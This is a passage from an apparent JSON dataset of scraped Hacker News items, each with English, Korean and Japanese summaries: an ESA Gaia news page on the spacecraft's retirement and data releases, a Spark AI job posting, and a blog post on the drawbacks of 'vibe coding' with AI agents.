Bolometric Correction Tool\n\n        GSPPhot-metallicity calibration\n\n        GSPSpec metallicity/logg calibration\n\n        OA self-organising map tool\n\n        Extinction as function of l-b\n\n        Extinction coefficients in various passbands\n\n        Fitted dr3 photometric uncertainties tool\n\n        NSS Tools\n\n        Gaia DR3 events\n\n        Gaia DR3 stories\n\n        Where are the stars?\n\n        How far away are the stars?\n\n        How bright are the stars?\n\n        What colour do they have?\n\n        Where do the stars go or come from?\n\n        Do they approach us or move away?\n\n        What is in between the stars?\n\n        Do they go boom?\n\n        What are they made of?\n\n        How big or warm or old are the stars?\n\n        Is it a double star?\n\n        Is it a galaxy?\n\n        Is it a quasar?\n\n        Is it a Solar System object?\n\n        Where is the DR3 data?\n\n        How did you produce the data for this star?\n\n        Who produced the data?\n\n        How do they blink?\n\n        Did something move in front?\n\n        Can I use the DR3 data with data from other missions or observatories\n\n        Gaia DR3 previews\n\n        Early Data Release 3\n\n        Gaia EDR3 overview\n\n        Gaia EDR3 content\n\n        Gaia EDR3 papers\n\n        Gaia EDR3 documentation\n\n        Gaia EDR3 known issues\n\n        Gaia (E)DR3 passbands\n\n        Gaia EDR3 auxiliary data\n\n        Gaia EDR3 Python code\n\n        Gaia EDR3 events\n\n        Gaia EDR3 Stories\n\n        Gaia EDR3 - DPAC\n\n        Gaia EDR3 - Galactic anticentre\n\n        Gaia EDR3 - Coordination Unit 5\n\n        Gaia EDR3 - Star Trails\n\n        Gaia EDR3 - Coordination Unit 3\n\n        Gaia EDR3 - Acceleration of the solar system\n\n        Gaia EDR3 - Gaia Catalogue of Nearby Stars\n\n        Gaia EDR3 - Structure of the Magellanic Clouds\n\n        Gaia EDR3 - Gaia EDR3 vs Gaia DR2\n\n        Gaia EDR3 - Questions and Answers\n\n        Data Release 2\n\n        Gaia DR2 overview\n\n        Gaia DR2 content\n\n        Gaia DR2 papers\n\n        Gaia DR2 documentation\n\n        Gaia DR2 known issues\n\n        Gaia DR2 primer\n\n        Gaia DR2 passbands\n\n        Gaia DR2 auxiliary data\n\n        Gaia DR2 data\n\n        Gaia DR2 stories\n\n        Data Release 1\n\n        Gaia DR1 overview\n\n        Gaia DR1 content\n\n        Gaia DR1 papers\n\n        Gaia DR1 documentation\n\n        Gaia DR1 known issues\n\n        Pre-launch passbands\n\n        Gaia DR1  auxiliary data\n\n        Data Release Schedule\n\n        Gaia Alerts\n\n        Gaia Photometric Science Alerts\n\n        Gaia Follow-Up Network for Solar System Objects\n\n        Gaia Auxiliary Data\n\n        Gaia (E)DR3  auxiliary data\n\n        Gaia DR2 auxiliary data\n\n        Gaia DR1 auxiliary data\n\n        General auxiliary data\n\n        Gaia Tools\n\n        Gaia BH3 tools\n\n        Gaia DR3 software tools\n\n        Gaia Community Tools\n\n        Gaia Observation Forecast Tool\n\n        Gaia Sky\n\n        Gaia-GOSA service\n\n                        Mission\n\n        Mission status\n\n        Science\n\n        Science Objectives\n\n        Science Performance\n\n        Transmission Profiles of all Instruments\n\n        Dispersion of the Photometric Instrument\n\n        Sky Variations\n\n        Science Topics - Information Sheets\n\n        Spacecraft & Instruments\n\n        Instruments\n\n        Astrometric Instrument\n\n        Photometric Instrument\n\n        Spectroscopic Instrument\n\n        Payload Module\n\n        Focal Plane\n\n        Launch\n\n        Launch sequence\n\n        Gaia's 4th launch anniversary\n\n        Gaia's launch anniversary - 10 years in space\n\n        Operations\n\n        Mission Operations (ESOC)\n\n        Science Operations (ESAC)\n\n        Scanning Law\n\n        Lagrange Point L2\n\n        Gaia end of observations\n\n        Technology tests\n\n        Observe Gaia from the ground\n\n        Gaia spacecraft observations 2025\n\n        Spacecraft passivation\n\n        Data Processing\n\n                        People & Institutes\n\n        Data Processing and Analysis Consortium\n\n        Gaia DPAC Executive\n\n        Project Office\n\n        Coordination Units\n\n        System architecture\n\n        Data simulations\n\n        Core processing\n\n        Object processing\n\n        Photometric processing\n\n        Spectroscopic reduction\n\n        Variability processing\n\n        Astrophysical parameters\n\n        Catalogue access\n\n        Data Processing Centres\n\n        List of Institutes involved in DPAC\n\n        DPAC Newsletter\n\n        DPAC Code of Conduct\n\n        Gaia People\n\n        Gaia Science Team\n\n        ESA teams\n\n        Industry involvement\n\n        Vacancies\n\n                        News & stories\n\n        News\n\n        Stories\n\n        Image of the week\n\n        Gaia on ESA Science & Technology\n\n        Gaia on ESA.int\n\n        ESA Gaia blog\n\n        Calendar / Conferences\n\n        Gaia Bulletin\n\n        Subscribe\n\n        Gaia Bulletin Archive\n\n        Gaia Newsletter (discontinued)\n\n        Gaia Newsletter Archive\n\n        Gaia in the Media\n\n        Vacancies\n\n                        Science Results\n\n        Gaia Publications in Peer-Reviewed Journals\n\n        Publishing guidelines\n\n        Communicating your results\n\n        Gaia's impact on science\n\n        Highlights of Gaia DR3\n\n        Highlights of Gaia EDR3\n\n        Highlights of Gaia DR2\n\n        Highlights of Gaia DR1\n\n        Milky Way\n\n                        Resources\n\n        Images\n\n        Videos\n\n        Brochures\n\n        Education Materials\n\n        Gaia Public Documents\n\n        Presentations\n\n        Gaia Applications\n\n        DPAC Outreach\n\n        Posters & Flyers\n\n        Selected Reports and Conference Proceedings\n\n        Phd Theses\n\n        Links\n\n                        Questions\n\n        Gaia Helpdesk\n\n        Archive Help\n\n        FAQs on Gaia Mission\n\n        FAQ on Gaia Archive and Data\n\n        Privacy Settings\n\nGaia Mission News - Gaia\n\n    Gaia News\n\n    2025-03-21 The disappearance of Gaia\n\nOn 4 March, astronomer Zhuo-Xiao Wang captured this view of the sudden disappearance of ESA’s Gaia spacecraft. After more than 11 years in space mapping the motions and properties of billions of stars, the spacecraft’s operations are coming to an end. Gaia will be switched off on 27 March 2025. During a series of final test operations, flight controllers at ESA’s ESOC mission control centre rotated Gaia, causing its sunshield to reflect more light towards Earth. As a result, Gaia appeared much brighter than usual and was observed by several citizen astronomers around the world. Gaia is seen here moving across the sky, initially brightening before vanishing as the spacecraft quickly rotates back to its typical orientation. This was the final time that Gaia will appear so bright to astronomers on Earth. The spacecraft will now remain ‘dark’ forever. The Gaia mission, however, will continue and culminate in two major data releases that are in preparation for 2026 and 2030.\n\nLast observations of the Gaia spacecraft from Beijing, China on 4 March 2026. Observations were performed using an 11-inch telescope. Credits: Zhuoxiao Wang - CC BY-SA 3.0 IGO.\n\nThe Gaia team is showcasing observations of the spacecraft at: https://www.cosmos.esa.int/web/gaia/ground-based-observations-of-gaia-spacecraft-2025\n\n    2025-02-21 Opening for a Gaia-related postdoc position in Leiden\n\nApplications are invited for a postdoctoral position at Leiden Observatory to work on (spectro-)photometric data processing for the Gaia mission in preparation for Gaia DR5. The tasks foreseen include: quality assessment of the calibration of the BP/RP spectra and the integrated photometry obtained from these spectra; studying and developing improvements to the removal of sky background, stray light, and effects of neighbouring sources from the raw BP/RP spectra; study and develop improvements to the flux and line spread function calibration for the BP/RP spectra.\n\nThe successful candidate will work under supervision of Anthony Brown and join the Gaia Data Processing and Analysis Consortium (DPAC). The\nwork will be embedded in Coordination Unit 5 (CU5, photometry) of DPAC, where close collaboration with the group at the Data Processing Center\nat the Institute of Astronomy in Cambridge is foreseen, as well as interaction with the other DPAC coordination units. In addition a fraction of the time will be spent on supporting the catalogue validation activities of the Gaia group at Groningen University.\n\nFull application details at: https://local.strw.leidenuniv.nl/jobs/brown_pd.php\n\n    2025-02-21 Gaia spacecraft passivation on 27 March\n\nOn 27 March 2025, the Gaia spacecraft will be passivated. While the Gaia spacecraft will enjoy its well-deserved retirement, the Gaia mission is far from over. The Gaia Data Processing and Analysis Consortium and ESA's Gaia science operations team is hard at work preparing Gaia's Data Release 4 (expected ~2026) and Gaia Data Release 5 (expected ~2030), with twice as many data products as Gaia's data release 3.\n\nA webpage has just been published on the Gaia passivation. More information on this milestone will be shared on this page around 27th of March.\n\n    2025-02-21 Another follow-up opportunity on 4 March to observe Gaia\n\nThe schedule on the page with information on how to observe Gaia has been updated. There will be another opportunity to observe Gaia on 4 March when the spacecraft will be shortly visible at its peak brightness of approximately 15th magnitude. Find observations made across the world here.\n\n    2025-02-11 Follow-up campaign to observe the Gaia spacecraft\n\nMany citizen astronomers have observed the Gaia spacecraft while it is more easily visible in the night sky and shared their observations with us. A dedicated webpage to cover this follow-up campaign has just been published and can be found here: https://www.cosmos.esa.int/web/gaia/ground-based-observations-of-gaia-spacecraft-2025.\n\nThe schedule indicating an approximate brightness for Gaia over the coming weeks has been updated as well and Gaia will still be visible for a little while longer. Find all details on how to observe the Gaia spacecraft from the ground here: https://www.cosmos.esa.int/web/gaia/observe-gaia.\n\n    2025-02-06 Gaia symposium at European Astronomical Society annual meeting in June\n\nIn June 2025, the European Astronomical Society will meet for its annual meeting. A symposium related to the Gaia mission is planned, Symposium S1 \"The (TWO) Billion Star Galaxy Census: Anticipating the Leap in Understanding of Planets, Stars, the Milky Way with Gaia DR4\".\n\nThe symposium now welcomes abstract submissions here. Abstract submission closes on 3 March 2025.\n\n    2025-02-05 Wobbling stars reveal hidden companions in Gaia data\n\nToday a story was published on esa.int/gaia on the discovery of an exoplanet Gaia-4b, which was hinted to exist purely from Gaia astrometric data. Find the full story here: Wobbling stars reveal hidden companions in Gaia data.\n\n    2025-01-23 Gaia's schedule for tests has changed\n\nThe schedule of the Gaia tests has changed. Gaia is remaining at maximum brightness for longer than initially planned. The Gaia ephemeris service remains valid and should be used for planning ground-based observations.The schedule will be updated here as soon as possible.\n\n    2025-01-19 Follow-up opportunities for Gaia\n\nThough Gaia stopped taking science observations, it is hard at work to perform a set of technology tests. As part of these tests, Gaia's angle with respect to the Sun will change, and the Gaia spacecraft's brightness is gradually increasing at the moment. While Gaia was a faint object in the sky during its science observation phase, it could potentially reach a 14 magnitude in the coming days. More details on Gaia's webpage to observe Gaia. Amateur astronomers & ground observatories are invited to observe Gaia's final moments before passivation.\n\n    2025-01-15 So long and thanks for all the fish! Last stars observed by Gaia this morning\n\nToday marks the end of Gaia's science observation phase. A story was published: \"Last starlight for ground-breaking Gaia\" on ESA's website, along with brand new visuals of our Milky Way (face-on) as well as edge-on. All visuals can be found from The Milky Way page on Gaia Cosmos along with a new animation featuring the Milky Way.\n\nHigh-contrast face-on impression of the Milky Way. By clicking the image, a higher-resolution version opens. Credits: ESA/Gaia/DPAC, Stefan Payne-Wardenaar - CC BY-SA 3.0 IGO. Find all versions from this page.\n\nAn infographic was created for this purpose as well: \"Sky-scanning complete for Gaia\".\n\n    2025-01-13 Self-registration is working again\n\nThe issue with the self-registration has been fixed now.\n\n    2024-12-20 Self-registration portlet is not working properly\n\nFollowing the migration of our web portal on Monday 16 December, some of our portlets are not yet fully functioning. The self-registration portlet, used for registering an account with our Gaia Archive, is currently having issues, not allowing all steps for the registration to be taken. Our apologies for the inconvenience. Our IT teams have indicated that it will take until early January before this issue can be fixed.\n\n    2024-12-03 New updates to the Gaia Community Tools\n\nWithin the astronomical community, many very useful tools are available for use with Gaia data. A non-exhaustive list is given on our Gaia Community Tools webpage. Several new updates were published recently to the page.\n\n    2024-11-29 New members of the Gaia Science Team\n\nA new group picture has been posted following the arrival of new members in the Gaia Science Team. Rodolfo Smiljanic from Warsaw, Poland and Johannes Sahlmann from ESAC (new Gaia Project Scientist since this year) now appear in the picture as well. We thank Timo Prusti for his contribution to the Gaia mission as project scientist. He was active as Gaia Science Team chair since 2007 and will retire from this duty end December 2024.\n\nFind the list of Gaia Science Team members here, with the new group picture as well.\n\n    2024-11-04 Pre-release of Gaia DR4 astrometric parameters for a star to be occulted by Uranus\nOn 12 November 2024 the star Gaia DR3 56716009513720320 will be occulted by the Solar System planet Uranus, which offers a rare opportunity to study the ring system and atmosphere of the planet. To allow for the best-possible planning for the ground-based occultation observing campaigns, we make the preliminary Gaia Data Release 4 (Gaia DR4) single-star astrometric solution parameters for this star public:\n\n      Object to be observed\n      Parameter name\n      Star occulted by Uranus\n\n      Date of occulation event\n\n      12 November 2024\n\n      Gaia DR4 source ID\n\n      56716009513720320\n\n      Epoch / Reference frame\n\n      2017.5 / ICRF\n\n      Right Ascension (RA) [degrees]\n      ra\n      52.79021223",
    "summary": {
      "en": "The text provides a summary of various space missions managed by the European Space Agency (ESA), categorizing them by their current status: \n\n1. **Future Missions**: Several missions are in development, including Athena, LISA, and ExoMars RFM 2028, among others.\n\n2. **Operational Missions**: Missions currently in operation include JUICE, Mars Express, and the James Webb Space Telescope (JWST).\n\n3. **Collaborative Missions**: There are multiple missions that are collaborative efforts, such as Hubble and Chandrayaan-1.\n\n4. **Completed Missions**: A list of completed missions includes Hipparcos, Giotto, and Rosetta.\n\nAdditionally, there is a focus on the Gaia mission, which has been mapping stars for over 11 years. Its operations will conclude on March 27, 2025, but data processing will continue, with major releases planned for 2026 and 2030. The text also mentions ongoing opportunities for citizen astronomers to observe Gaia as it brightens before its retirement.",
      "ko": "유럽우주국(ESA)이 관리하는 다양한 우주 임무에 대한 요약이 제공된다. 현재 상태에 따라 임무를 분류하면 다음과 같다.\n\n먼저, 미래 임무로는 아테나, 리사, 엑소마르스 RFM 2028 등 여러 임무가 개발 중이다. \n\n운영 중인 임무에는 주스(JUICE), 화성 탐사선(Mars Express), 제임스 웹 우주 망원경(JWST) 등이 포함된다. \n\n협력 임무로는 허블(Hubble)과 찬드라얀-1(Chandrayaan-1)과 같은 여러 공동 프로젝트가 있다. \n\n완료된 임무 목록에는 히파르코스(Hipparcos), 지오토(Giotto), 로제타(Rosetta)가 포함된다. \n\n또한, 가이아(Gaia) 임무에 대한 언급이 있다. 가이아는 11년 넘게 별을 지도화하고 있으며, 2025년 3월 27일에 운영이 종료될 예정이다. 그러나 데이터 처리 작업은 계속되며, 2026년과 2030년에 주요 데이터가 공개될 계획이다. 이와 함께 시민 천문학자들이 가이아가 퇴역하기 전 밝아지는 모습을 관찰할 수 있는 기회도 계속 제공된다고 한다.",
      "ja": "欧州宇宙機関（ESA）が管理するさまざまな宇宙ミッションの概要が、現在の状況に応じて分類されています。\n\n未来のミッションとしては、アテナ、LISA、エクソマーズRFM 2028など、いくつかのミッションが開発中です。運用中のミッションには、JUICE、マーズエクスプレス、ジェームズ・ウェッブ宇宙望遠鏡（JWST）があります。共同ミッションには、ハッブル宇宙望遠鏡やチャンドラヤーン1号など、複数の共同プロジェクトが含まれています。完了したミッションには、ヒッパルコス、ジオット、ロゼッタなどがあります。\n\n特にガイアミッションに注目が集まっています。このミッションは11年以上にわたり星の地図を作成してきましたが、2025年3月27日に運用が終了します。ただし、データ処理は続き、2026年と2030年に主要なデータの公開が予定されています。また、ガイアが退役前に明るくなる時期に、一般市民の天文学者が観測する機会も提供されています。"
    }
  },
  {
    "id": "c03c2fe6e243884a",
    "title": {
      "en": "Spark AI (YC W24) is hiring a full-stack engineer in San Francisco",
      "ko": "스파크AI, SF에서 풀스택 엔지니어 채용!",
      "ja": "サンフランシスコでエンジニア募集！"
    },
    "type": "job",
    "url": "https://www.ycombinator.com/companies/spark/jobs/kDeJlPK-software-engineer-full-stack",
    "score": 1,
    "by": "tk90",
    "time": 1743282035,
    "content": "About Spark\nSpark is building an advanced AI research tool that helps energy developers build solar farms and battery plants.\nOne of the biggest challenges in renewable energy is not construction — it’s navigating local regulations. We build AI agents that help energy developers find and understand critical information to develop and invest in solar farms.\nIndustry leaders like Colliers Engineering & Design, Standard Solar, and Cypress Creek Renewables use Spark to inform their investment decisions. Our customers’ energy pipelines will produce the equivalent of 60GW — enough to power tens of millions of households a year!\nIf you're interested in learning how the energy infrastructure works and how you can help accelerate a historical energy transition with AI and software, we’d love to hear from you!\nThe Team\nWe’re funded by top investors, including AI Grant (Nat Friedman and Daniel Gross), the founders of Brex, Plaid, Helioscope (acq. Aurora Solar), and more (to be announced).\nYou’ll be part of a small and ambitious team that has led Engineering and Product at Tesla, Apple, Brex, and Google. As an early member of the team, you’ll work closely with the founders and shape the engineering culture.\nWe are an in-person company in San Francisco, CA, and we are in the office 5 days a week.\nWe use Typescript, NextJS, NodeJS, and Postgres.\nResponsibilities\n\nDesign and build our core APIs, AI infrastructure, and data pipeline that scrapes millions of data points every week\nOwn features end-to-end from working on an idea with the founders to designing, testing, shipping to prod, and getting feedback from customers\nArchitect and build cutting-edge AI systems like agentic web browsing, RAG, and data extraction\nWrite both frontend and backend code\nWork closely with the founders to build the product roadmap\nTalk to customers and understand how the energy industry works to inform better product decisions\n\nYou’re a great fit if…\nYou have 3+ years of experience\nYou love writing code but also care about having a significant impact. Being an early engineer means making the right trade-offs between writing perfect code and “good enough” for the situation.\nYou believe that everything can be figured out. You can take a fuzzy goal, work independently toward a solution, and communicate effectively along the way.\nYou want to be a founder one day. You’ll see what it's like to start a vertical AI company (in the energy space). If there’s anything about business or tech you’re interested in, we’ll teach you.\nYou’re NOT a great fit if…\nYou want to ship perfect code. Speed is one of our main advantages as a startup. We don’t have the luxury of spending time on perfection, and we always try to do more with less.\nYou don’t care about the business side of things. Our technical decisions and business strategy go hand in hand. Understanding how they influence each other helps us build the right things.",
    "summary": {
      "en": "**Summary of Spark**\n\nSpark is creating an AI research tool designed to assist energy developers in building solar farms and battery plants by simplifying the navigation of local regulations. Their AI agents help find and understand vital information for solar farm development. Major companies like Colliers Engineering & Design and Standard Solar utilize Spark's tools, potentially generating enough energy to power millions of homes.\n\nSpark's team consists of experienced professionals from top companies like Tesla and Google. They are based in San Francisco and work in-person five days a week, using technologies like Typescript and NodeJS.\n\n**Key Responsibilities:**\n- Develop core APIs and AI systems that analyze large data sets.\n- Manage features from initial ideas to customer feedback.\n- Collaborate with founders to shape the product.\n\n**Ideal Candidate:**\n- Has 3+ years of experience and is passionate about coding with a focus on impact.\n- Is proactive in problem-solving and interested in business aspects.\n- Aspires to start their own company.\n\n**Not a Good Fit If:**\n- You prioritize perfect code over speed.\n- You are not interested in the intersection of technical and business decisions.",
      "ko": "스파크는 에너지 개발자들이 태양광 발전소와 배터리 공장을 건설하는 데 도움을 주기 위해 지역 규제를 쉽게 이해할 수 있도록 돕는 AI 연구 도구를 개발하고 있습니다. 이들의 AI 에이전트는 태양광 발전소 개발에 필요한 중요한 정보를 찾고 이해하는 데 도움을 줍니다. 콜리어스 엔지니어링 & 디자인, 스탠다드 솔라와 같은 주요 기업들이 스파크의 도구를 사용하고 있으며, 이를 통해 수백만 가구에 전력을 공급할 수 있는 에너지를 생성할 수 있습니다.\n\n스파크 팀은 테슬라와 구글과 같은 유명 기업에서 경력을 쌓은 전문가들로 구성되어 있습니다. 이들은 샌프란시스코에 본사를 두고 있으며, 주 5일 대면으로 근무하며 Typescript와 NodeJS와 같은 기술을 사용합니다.\n\n주요 책임으로는 대량의 데이터 세트를 분석하는 핵심 API와 AI 시스템을 개발하고, 초기 아이디어에서 고객 피드백까지 기능을 관리하며, 창립자들과 협력하여 제품을 형성하는 일이 포함됩니다.\n\n이상적인 후보자는 3년 이상의 경력을 가지고 있으며, 영향력을 중시하는 코딩에 열정을 가진 사람입니다. 문제 해결에 적극적이며 비즈니스 측면에도 관심이 있는 사람을 찾고 있습니다. 또한, 자신의 회사를 시작하고자 하는 열망이 있는 지원자를 원합니다.\n\n적합하지 않은 후보자는 완벽한 코드를 속도보다 우선시하는 사람이나 기술적 결정과 비즈니스 결정의 교차점에 관심이 없는 사람입니다.",
      "ja": "Sparkは、エネルギー開発者が太陽光発電所やバッテリー工場を建設する際に、地域の規制を簡単に理解できるようにするAI研究ツールを開発しています。彼らのAIエージェントは、太陽光発電所の開発に必要な重要な情報を見つけ、理解する手助けをします。Colliers Engineering & DesignやStandard Solarといった大手企業もSparkのツールを利用しており、これにより数百万の家庭に電力を供給できる可能性があります。\n\nSparkのチームは、TeslaやGoogleなどの大手企業での経験を持つ専門家で構成されています。サンフランシスコに拠点を置き、週5日対面で働いており、TypescriptやNodeJSといった技術を使用しています。\n\n主な業務内容には、大規模データセットを分析するためのコアAPIやAIシステムの開発、初期アイデアから顧客のフィードバックまでの機能管理、創業者と協力して製品を形作ることが含まれます。\n\n理想的な候補者は、3年以上の経験があり、影響を与えることに情熱を持ってコーディングに取り組む人です。問題解決に積極的で、ビジネス面にも興味を持っていることが求められます。また、自分自身の会社を立ち上げたいと考えている人が望ましいです。\n\nもし、完璧なコードを優先しすぎる人や、技術的な決定とビジネス的な決定の交差点に興味がない人は、適していません。"
    }
  },
  {
    "id": "023e535f3c45aaf4",
    "title": {
      "en": "Breaking up with vibe coding",
      "ko": "바이브 코딩 탈출",
      "ja": "バイブコーディング卒業"
    },
    "type": "story",
    "url": "https://www.lucasaguiar.xyz/posts/vibe-coding-pitfalls/",
    "score": 37,
    "by": "isfttr",
    "time": 1743293832,
    "content": "BlogWhy I'm Breaking Up With Vibe CodingBy Lucas Fernandes AguiarMarch 20, 2025We’ve all been there: headphones on, music pumping, fingers flying across the keyboard, lost in the “flow” with your favorite AI agent. This, my friends, is vibe coding. It’s when you’re in the zone, seemingly effortlessly producing code.It’s the idea that you can create great software simply by immersing yourself in the feeling of coding, trusting your intuition and riding the wave of inspiration. But lately, I’ve realized that for me, at least, the vibe is…off. It’s like I’m watching an AI agent code for me, occasionally chiming in with a suggestion or a correction, but often just observing the code unfold without fully grasping the intricacies of what’s happening can lead to wasting my time later.What is Vibe Coding Anyway?Vibe coding is less a methodology and more a state of mind. It’s about prioritizing the use of an AI agent over really thinking through the code implementation with structured planning and rigorous testing. It’s about chasing that dopamine hit of making progress, often without a clear roadmap. It’s seductive because it feels productive.Why the Vibe is Failing MeFor the last two months, I’ve been relying heavily on vibe coding, and the results haven’t been pretty. Here’s why:First, I was initially drawn to AI agents like Cline, Roo Code, and then tried the Cursor editor because they promised to enhance my coding flow. I loved the idea of having an AI partner that could anticipate my needs and help me write code faster. However, I quickly realized that this approach was leading me astray.What I realized is that using the AI agent is fine for creating a mockup of what you want, but after that, the context windows and everything leads to more and more rework over time. This happens because in your frustration, the first thing that comes to mind is just explain to the model again, without even knowing what has been implemented in the first place. This is understandable since in a matter of minute, the agent could have written a thousand lines of code and, obviously, this is kind of insane.The greatest problems that I see in vibe coding are:It can be a huge time sink: in the beginning you seem to getting places, but since you have no structure, you are being led by what is appearing in the screen, and you become consumed by the next error or working feature that appears on the screen.It is expensive: this is a consequence of the first problem. As context windows grow, the requests get more expensive, and rapidly you can see numbers like 500k tokens sent, and a fraction of that received.In the end, it doesn’t seem to be a huge timesaver for many tasks, if you begin a project with no structure, that is. The time you “save” in the beginning, you’ll have to use it later to rewrite the code to do what you intended in the first place.Flip side: an enthusiast’s viewBut there are also many benefits, since I can at least understand more about the code with time. Beginning this journey, it was clear to me that it would take time and money for me to create worthwhile project. Something that initially can seem unreachable, after reading the code multiple times trying to understand errors, I have begun understand the structure and syntax of the language. In my case, I am focusing my efforts in learning Python, so most of the code that I am creating is in Python. With time I can understand better what is the error and can nudge the model towards the solution.Vibe Coding vs. AI Chat vs. Web SearchVibe Coding: Great for initial exploration and getting a feel for a problem, but terrible for structured development and complex projects.\nAI Chat (ChatGPT, etc.): Useful for generating boilerplate code and getting quick answers, but can lead to reliance on AI-generated solutions without fully understanding them. Requires careful verification and can suffer from “AI hallucinations”.\nWeb Search (Google, etc.): Essential for finding specific solutions and understanding concepts, but can be overwhelming and time-consuming if you don’t know what you’re looking for.The balance seems to be on using tab completion inside the editor and using something like Gemini Code Assist. I am using the Gemini Code Assistant because it is free, but I am really liking it. I am using it in VS Code and recommend it. It is really good in creating unit tests, and while running tests it is fairly good in resolving the failures. As it is the first time that I am creating unit tests for my code, it is a bit confusing for me to understand what is going on, but with the assistance of Gemini it seems reachable.Another thing that I tried, but am leaning to the side of ditching it is using an agent like Roo Code or Cline. They can go on for a long time and consume loads of tokens with not guarantee of working in the end. So the problem becomes how to make this cheaper with time. GosuCoder is someone that I see testing various strategies on how to keep costs down, but the main bottleneck is the use of Claude. While it seems to be the only one with full support for everything, it is one of the most expensive models to run, and with the tendency to use tons of tokens, the costs becomes prohibitive for most people. If not for this, Gemini 2.0 and DeepSeek V3/Chat seem really good for most uses in coding (at least for me).Another strategy have been using Open WebUI, which I have been liking a lot. It has a ton of features and options, which gives a lot of control. What I like is to use custom models for different use cases of mine (coding, patents, phd, etc.). It is mostly inexpensive and when using Gemini it gives a really good context window to edit large files. What it seems to be really good use case is pasting text and rearranging it, removing spaces, displaying in tables, and things like that. The ability to do the custom prompts also gives the possibility to save money on tokens.Conclusion: Finding a Better BalanceI’m not saying vibe coding is always bad. There’s definitely value in letting your creativity flow and exploring ideas without rigid constraints. However, I’ve learned that it’s not a sustainable approach for me, especially when deadlines loom and API costs mount. For me, Gemini Code Assist seem to be a great alternative, because it is free and has a great context window. Also, Open WebUI is great because of the control and customizability, and the costs are relatively low for everyday tasks.For me, this seems to be the best balance for now, but I am leaning to eventually pay for a chat app, like Perplexity (which has a good free tier and costs 20 dollars per month), since I am paying around 30 dollars/month for the last 2 months in API usage. In the future, maybe it will make sense to have a model running locally, but I think the costs for API usage will be lower as more efficient models are launched.You can reach out to contact me about this and other topics at my email lucas.fernandes.df@gmail.com or by filling the form below.\nSendform{display:block;grid-gap:10rem;text-align:center;padding:2rem 0;margin:0}form label{display:contents}form input[type=email],form textarea{width:100%}form button{font-family:inherit;font-size:inherit;border:1px solid;background:0 0;padding:.5rem;border-radius:10px}form textarea{resize:vertical}form button{justify-self:center;border-radius:10px}Related PostsThe AI Copy-Paste Problem: Killing Software Lock-In & Why Data Portability is KeyObsidian + Copilotartificial-intelligencecursorvibe codingclaude.bmc-btn svg {\n    height: 32px !important;\n    margin-bottom: 0px !important;\n    box-shadow: none !important;\n    border: none !important;\n    vertical-align: middle !important;\n    transform: scale(0.9);\n    flex-shrink: 0;\n}\n\n.bmc-btn {\n    min-width: 210px;\n    color: #000000;\n    background-color: #FFDD00 !important;\n    height: 60px;\n    border-radius: 12px;\n    font-size: 28px;\n    font-weight: Normal;\n    border: none;\n    padding: 0px 24px;\n    line-height: 27px;\n    text-decoration: none !important;\n    display: inline-flex !important;\n    align-items: center;\n    font-family: 'Cookie', cursive !important;\n    -webkit-box-sizing: border-box !important;\n    box-sizing: border-box !important;\n}\n\n.bmc-btn:hover, .bmc-btn:active, .bmc-btn:focus {\n    text-decoration: none !important;\n    cursor: pointer;\n}\n\n.bmc-btn-text {\n   text-align: left;\n   margin-left: 8px;\n   display: inline-block;\n   line-height: 0;\n   width: 100%;\n   flex-shrink: 0;\n   font-family: [FONT] !important;\n}\n\n.logo-outline {\n    fill: #000000;\n}\n\n.logo-coffee {\n    fill: #ffffff;\n}\n\nBuy me a coffee\nShare on\nFacebookTweetSubmit to RedditShare on LinkedInSend emailul.share-buttons{list-style:none;padding:0}ul.share-buttons li{display:inline}ul.share-buttons .sr-only{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);padding:0;border:0;height:1px;width:1px;overflow:hidden}(function(e,t,n){var s,o=e.getElementsByTagName(t)[0];if(e.getElementById(n))return;s=e.createElement(t),s.id=n,s.src=\"https://connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v3.0\",o.parentNode.insertBefore(s,o)})(document,\"script\",\"facebook-jssdk\")lang:en_US\ndocument.getElementById(\"copy-link\").addEventListener(\"click\",function(){navigator.clipboard.writeText(window.location.href).then(function(){console.log(\"Link copied to clipboard!\")}).catch(function(e){console.error(\"Could not copy link: \",e)})})\nSendform{display:block;grid-gap:10rem;text-align:center;padding:2rem 0;margin:0}form label{display:contents}form input[type=email],form textarea{width:100%}form button{font-family:inherit;font-size:inherit;border:1px solid;background:0 0;padding:.5rem;border-radius:10px}form textarea{resize:vertical}form button{justify-self:center;border-radius:10px}",
    "summary": {
      "en": "In the blog post \"Why I'm Breaking Up With Vibe Coding,\" Lucas Fernandes Aguiar discusses his experience with \"vibe coding,\" which is the practice of coding while in a creative flow, often with the help of AI tools. Initially, he enjoyed vibe coding because it felt productive, but he later found that it led to confusion and inefficiencies in his coding process.\n\nKey points include:\n\n1. **Definition of Vibe Coding**: It's more about the mindset of coding with AI assistance rather than following structured planning and testing. It can feel productive but lacks clear direction.\n\n2. **Challenges Faced**: After two months of relying on vibe coding, Aguiar experienced significant issues:\n   - It became a time sink as he was distracted by on-screen errors and features.\n   - It turned out to be costly, as using AI tools generated a lot of code that required extensive rework later.\n\n3. **Comparison with Other Tools**: \n   - **AI Chat**: Helpful for quick answers and boilerplate code but can lead to dependency without understanding.\n   - **Web Search**: Useful for specific solutions but can be overwhelming.\n   - He found that tools like Gemini Code Assist and Open WebUI offered better balance, providing assistance without excessive costs.\n\n4. **Conclusion**: While vibe coding has its merits, especially for creativity, it's not sustainable for structured projects. Aguiar suggests using tools that offer better cost control and coding assistance, highlighting the importance of finding a balance between creativity and structured development.",
